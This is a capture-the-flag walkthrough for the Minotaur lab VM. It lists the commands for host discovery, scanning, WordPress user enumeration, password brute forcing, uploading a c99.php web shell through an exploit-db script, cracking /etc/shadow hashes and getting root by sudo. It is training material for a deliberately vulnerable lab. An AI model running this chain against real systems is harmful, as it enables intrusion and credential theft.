# BNE0x00 - Minotaur CTF Walkthough by Bull (@RobertWinkel)

1.	Run “netdiscover –r 192.168.56.0/24” to find the IP address of 192.168.56.223.
2.	Run “nmap –sV 192.168.56.223” to find out there is a webserver running on port 80.
3.	Connect to the webserver via http://192.168.56.223/ and find it displays a default Apache web page.
4.	Run dirbuster to find /bull/.
5.	Connect to http://192.168.56.223/bull/. Notice that it is “Proudly powered by WordPress”.
6.	Run “wpscan -u http://192.168.56.223/bull/ --enumerate u” and discover the username “bully”.
7.	Generate a password list based on the web page, e.g.:
  1.	cewl -m 5 -w minotaur_words.txt http://192.168.56.223/bull/
  2. john --wordlist=minotaur_words.txt --rules --stdout > minotaur_words_mutated.txt
8.	Run a password brute-forcer over the mutated wordlist to get the password, e.g. “wpscan -u http://192.168.56.223/bull/ -U bully -w /root/minotaur_words_mutated.txt”. **Note that wpscan needs the absolute path for the wordlist file**
9.	From the previously run of wpscan, notice the vulnerability with Slideshow Gallery.
10.	Go to http://www.exploit-db.com/exploits/34681/ and see that it requires credentials to run. Use the exploit to upload a shell, e.g.:
  1. python wp_gallery_slideshow_146_suv.py -t http://192.168.56.223/bull/ -u bully -p Bighornedbulls -f c99.php
   **Note: There are a couple other ways of uploading a shell, using Wordpress itself (e.g. update a theme)**
11.	Using the exploit, the first flag can be gained from /var/www/html/flag.txt. The second flag in /tmp/flag.txt.
12.	Using the exploit, find /tmp/shadow.bak file. Get the /etc/passwd file and unshadow them, e.g:
  1. root@kali:~# unshadow minotaur_passwd.txt minotaur_shadow.txt > minotaur_unshadow.txt
13.	Crack the passwords of a couple of the users, (heffer’s password should take around 1.5 minutes to crack. minotaur’s password should take around 12 minutes. The others should be uncrackable) e.g.:
  1. root@kali:~# john minotaur_unshadow.txt
14.	Login as heffer and grab ~heffer/flag.txt
15.	Login as minotaur and grab ~minotaur/flag.txt
16.	As minotaur, run a simple “sudo –s” to get a root shell. Grab /root/flag.txt.
17.	GAME OVER MAN. GAME OVER!

